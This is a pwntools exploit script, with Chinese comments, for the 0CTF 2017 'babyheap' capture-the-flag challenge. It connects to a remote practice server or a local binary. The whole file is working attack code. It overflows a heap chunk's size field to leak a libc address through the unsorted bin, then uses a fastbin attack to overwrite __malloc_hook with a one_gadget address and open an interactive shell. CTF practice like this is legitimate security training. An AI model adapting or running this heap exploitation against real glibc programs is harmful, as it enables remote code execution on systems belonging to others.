from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
rl      = lambda                    :p.recvline()
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'

binary = './babyheap_0ctf_2017'

context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn',28473) if argv[1]=='r' else process(binary)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
# libc = ELF('./libc-2.23.so')

def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def dbg():
	gdb.attach(p)
	pause()
# start
def add(size):
    sla(b': ',b'1')
    sla(b'Size: ',int2bytes(size))

def edit(index,content):
    sla(b': ',b'2')
    sla(b'Index: ',int2bytes(index))
    sla(b'Size: ',int2bytes(len(content)))
    sla(b'Content: ',content)

def show(index):
    sla(b': ',b'4')
    sla(b'Index: ',int2bytes(index))
    ru(b'Content: \n')



def delete(index):
    sla(b': ',b'3')
    sla(b'Index: ',int2bytes(index))


#---------------这3个一组，是为了泄漏libc地址----------#
add(0x10)#0
add(0x10)#1
add(0x80)#2
#---------------这3个一组，是为了fastbin attack 覆写malloc hook 为one_gadget ----------#
add(0x30)#3
add(0x68)#4
add(0x10)#5
#------------------泄漏libc地址------------------------------------#
edit(0,b'a'*0x10+p64(0)+p64(0xb1))#通过edit(0)来改变chunk1的大小，使其包裹chunk2
delete(1)
add(0xa0)
edit(1,b'a'*0x10+p64(0)+p64(0x91))#因为使通过calloc申请回chunk1的所以chunk2被清零，我们要恢复chunk2

delete(2)
show(1)
data = uu64(ru(b'\x7f',drop=False)[-6:])#这里调试了好久才发现不能直接沿用exp1的r(6),因为此时打印的chunk1有0xb0大小，exp1只有0x20大小
base = data-88-libc.sym['__malloc_hook']-0x10
leak('base',base)
malloc_hook = base+libc.sym['__malloc_hook']
base1 = data - (0x3c4b20 + 0x58)  #和上面一样两种通过unsorted bin求libc基地址的方法都可以达到效果
leak('base1',base1)


#-----------------fastbin attack-------------------------------------#
delete(4)
edit(3,b'a'*0x30+p64(0)+p64(0x71)+p64(malloc_hook-0x23))
add(0x68)#2
add(0x68)#4

one_gadget = base + 0x4526a
#使用rsp+30的one_gadget，本地libc地址为0x4527a，远程lic地址为0x4526a
edit(4,b'a'*(0x23-0x10)+p64(one_gadget))
add(0x10)
itr()
